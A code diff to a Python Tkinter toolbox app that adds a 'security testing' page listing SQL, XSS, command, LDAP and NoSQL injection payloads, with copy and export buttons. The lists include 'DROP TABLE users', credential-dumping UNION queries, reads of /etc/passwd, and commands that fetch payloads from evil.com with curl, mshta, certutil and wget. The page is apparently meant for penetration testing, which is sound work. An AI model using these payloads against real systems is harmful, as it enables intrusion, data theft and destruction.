@@ -1478,6 +1478,7 @@ class ToolboxApp(tk.Tk):
         ("文件处理", [0, 1, 2, 3]),       # 图片转PDF/图片批量转ZIP/文件分割/文件合并
         ("数据生成", [4, 5, 6]),          # 生成指定大小文件/生成指定长度文本/随机人员信息
         ("开发工具", [8, 7, 9, 10]),      # 接口请求/URL编码解码/JSON格式化/JSON对比
+        ("安全测试", [14]),               # 上传注入
         (None, [11, 13, 12]),             # 截图识别表格/设置/关于（独立功能不分组，设置在关于上方）
     ]
 
@@ -1605,7 +1606,7 @@ class ToolboxApp(tk.Tk):
     def _page_title(self, index):
         return ["图片转 PDF", "单图单PDF转ZIP", "文件分割", "文件合并",
                 "生成指定大小文件", "生成指定长度文本", "随机人员信息",
-                "URL编码解码", "接口请求", "JSON格式化", "JSON对比", "截图识别表格", "关于", "设置"][index]
+                "URL编码解码", "接口请求", "JSON格式化", "JSON对比", "截图识别表格", "关于", "设置", "安全测试"][index]
 
     def _select_menu(self, index):
         self._save_current_log()
@@ -1665,6 +1666,8 @@ class ToolboxApp(tk.Tk):
                         self._show_page_about()
                     elif index == 13:
                         self._show_page_settings()
+                    elif index == 14:
+                        self._show_page_security()
         except Exception:
             _err = traceback.format_exc()
             try:
@@ -3898,6 +3901,184 @@ class ToolboxApp(tk.Tk):
         self._ocr_table_data = []
         self._ocr_tree.delete(*self._ocr_tree.get_children())
         self._ocr_tree["columns"] = []
+
+    # =============== 页面14: 安全测试 ===============
+    def _show_page_security(self):
+        self.title_label.config(text="安全测试")
+        self._label(self.content, "选择注入类型，生成可测试的注入代码，支持复制和导出为文件。").pack(anchor="w", pady=(0, 8))
+
+        row1 = self._row(self.content)
+        self._label(row1, "注入类型:").pack(side="left")
+        self._security_type_var = tk.StringVar(value="sql")
+        types = ["sql", "xss", "cmd", "ldap", "nosql"]
+        type_names = {"sql": "SQL注入", "xss": "XSS脚本注入", "cmd": "命令注入", "ldap": "LDAP注入", "nosql": "NoSQL注入"}
+        ttk.Combobox(row1, textvariable=self._security_type_var,
+                     values=[type_names[t] for t in types], state="readonly", width=16).pack(side="left", padx=(4, 10))
+        self._security_types = types
+
+        tk.Button(row1, text="生成代码", command=self._generate_injection,
+                  bg="#e67e22", fg="white",
+                  font=("Microsoft YaHei UI", 10, "bold"), width=12).pack(side="left", padx=(0, 10))
+
+        # 代码展示区
+        code_frame = tk.Frame(self.content, bg="#f5f6fa")
+        code_frame.pack(fill="both", expand=True, pady=(4, 4))
+        self._security_code_text = tk.Text(code_frame, font=("Consolas", 10),
+                                             state="disabled", wrap="word", bg="#1e1e1e", fg="#d4d4d4")
+        self._security_code_text.pack(side="left", fill="both", expand=True)
+        scrollbar = ttk.Scrollbar(code_frame, orient="vertical", command=self._security_code_text.yview)
+        scrollbar.pack(side="right", fill="y")
+        self._security_code_text["yscrollcommand"] = scrollbar.set
+
+        # 操作按钮区
+        btn_row = self._row(self.content)
+        tk.Button(btn_row, text="复制", command=self._copy_injection, width=10).pack(side="left", padx=(0, 10))
+        tk.Button(btn_row, text="导出", command=self._export_injection, width=10).pack(side="left")
+
+        # 初始化空提示
+        self._security_code_text.config(state="normal")
+        self._security_code_text.insert("1.0", "点击上方「生成代码」按钮生成注入测试代码。")
+        self._security_code_text.config(state="disabled")
+        self._security_current_type = "sql"
+        self._security_code_lines = []
+
+    def _generate_injection(self):
+        """根据选中类型生成注入代码"""
+        type_label = self._security_type_var.get()
+        type_map = {"SQL注入": "sql", "XSS脚本注入": "xss", "命令注入": "cmd",
+                     "LDAP注入": "ldap", "NoSQL注入": "nosql"}
+        self._security_current_type = type_map.get(type_label, "sql")
+
+        payloads = {
+            "sql": [
+                "' OR '1'='1",
+                "' OR 1=1--",
+                "' UNION SELECT NULL,NULL,NULL--",
+                "'; DROP TABLE users--",
+                "admin' OR '1'='1'--",
+                "' OR EXISTS(SELECT * FROM information_schema.tables)--",
+                "' UNION SELECT username,password FROM users--",
+                "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
+                "' OR 1=1 LIMIT 1--",
+                "' AND SLEEP(5)--",
+                "' OR 'a'='a",
+                "\" OR \"1\"=\"1",
+                "' OR 1=1#",
+                "'; WAITFOR DELAY '0:0:5'--",
+                "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
+            ],
+            "xss": [
+                "<script>alert(1)</script>",
+                "<img src=x onerror=alert(1)>",
+                "<svg onload=alert(1)>",
+                "<body onload=alert(1)>",
+                "<iframe src=javascript:alert(1)>",
+                "<a href=javascript:alert(1)>click</a>",
+                "<div onmouseover=alert(1)>hover</div>",
+                "<input onfocus=alert(1) autofocus>",
+                "<details ontoggle=alert(1) open>",
+                "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
+                "<svg><script>alert(1)</script></svg>",
+                "\"><script>alert(1)</script>",
+                "'><script>alert(1)</script>",
+                "<img src=1 onerror=alert(1)>",
+                "<marquee onstart=alert(1)>",
+            ],
+            "cmd": [
+                "; dir",
+                "&& whoami",
+                "| cat /etc/passwd",
+                "$(whoami)",
+                "`whoami`",
+                "| ls -la",
+                "; ipconfig",
+                "&& type C:\\windows\\system32\\drivers\\etc\\hosts",
+                "| powershell Get-Process",
+                "; ping 127.0.0.1 -n 5",
+                "|| dir",
+                "| curl http://evil.com/shell",
+                "& mshta http://evil.com/shell.hta",
+                "| certutil -urlcache -f http://evil.com/malware.exe",
+                "; wget http://evil.com/shell.sh",
+            ],
+            "ldap": [
+                "*",
+                "(objectClass=*)",
+                "*)(uid=*",
+                "(&(objectClass=user)(cn=*))",
+                "(cn=*)(|(uid=*)(sn=*))",
+                "(&(uid=*)(objectClass=person))",
+                "(|(cn=admin)(uid=admin))",
+                "(&(mail=*)(|(!(cn=*))(|(sn=*))))",
+                "(&(objectClass=*)(memberOf=cn=admin,ou=groups,dc=example,dc=com))",
+                "(|(uid=admin)(userPassword=*))",
+            ],
+            "nosql": [
+                '{"$gt": ""}',
+                '{"$ne": null}',
+                '{"$gt": "", "$lt": ""}',
+                '{"$where": "return true"}',
+                '{"$gt": "", "$exists": true}',
+                '{"$regex": ".*"}',
+                '{"$where": "this.password == \"admin\""}',
+                '[{"$gt": ""}]',
+                '{"username": {"$eq": "admin"}, "password": {"$ne": null}}',
+                '{"$or": [{"username": "admin"}, {"password": {"$exists": true}}]}',
+            ],
+        }
+
+        selected = payloads.get(self._security_current_type, payloads["sql"])
+        lines = []
+        for i, p in enumerate(selected, 1):
+            lines.append(f"{i}. {p}")
+
+        self._security_code_lines = selected
+        self._security_code_text.config(state="normal")
+        self._security_code_text.delete("1.0", "end")
+        self._security_code_text.insert("1.0", "\n".join(lines))
+        self._security_code_text.config(state="disabled")
+        self._log(f"[安全测试] 已生成 {self._security_current_type.upper()} 注入代码，共 {len(selected)} 条")
+
+    def _copy_injection(self):
+        """复制当前代码到剪贴板"""
+        if not self._security_code_lines:
+            self._notify("没有可复制的代码，请先生成")
+            return
+        text = "\n".join(self._security_code_lines)
+        self.clipboard_clear()
+        self.clipboard_append(text)
+        self._notify("注入代码已复制到剪贴板")
+
+    def _export_injection(self):
+        """导出注入代码到文件"""
+        if not self._security_code_lines:
+            self._notify("没有可导出的代码，请先生成")
+            return
+
+        ext_map = {
+            "sql": (".sql", "SQL文件", "*.sql"),
+            "xss": (".html", "HTML文件", "*.html"),
+            "cmd": (".txt", "文本文件", "*.txt"),
+            "ldap": (".txt", "文本文件", "*.txt"),
+            "nosql": (".txt", "文本文件", "*.txt"),
+        }
+        default_ext, file_desc, pattern = ext_map.get(self._security_current_type, (".txt", "文本文件", "*.txt"))
+
+        f = filedialog.asksaveasfilename(
+            title=f"导出{file_desc}",
+            defaultextension=default_ext,
+            filetypes=[(file_desc, pattern), ("所有文件", "*.*")],
+            initialdir=_APP_DIR,
+            initialfile=f"injection_{self._security_current_type}")
+        if not f:
+            return
+        try:
+            with open(f, "w", encoding="utf-8") as fp:
+                fp.write("\n".join(self._security_code_lines))
+            self._notify(f"注入代码已导出到: {f}")
+            self._log(f"[安全测试] 已导出 {self._security_current_type.upper()} 代码到: {f}")
+        except Exception as e:
+            self._notify(f"导出失败: {e}")
 
     # =============== 全局字体缩放 ===============
     def _apply_font_scale(self):
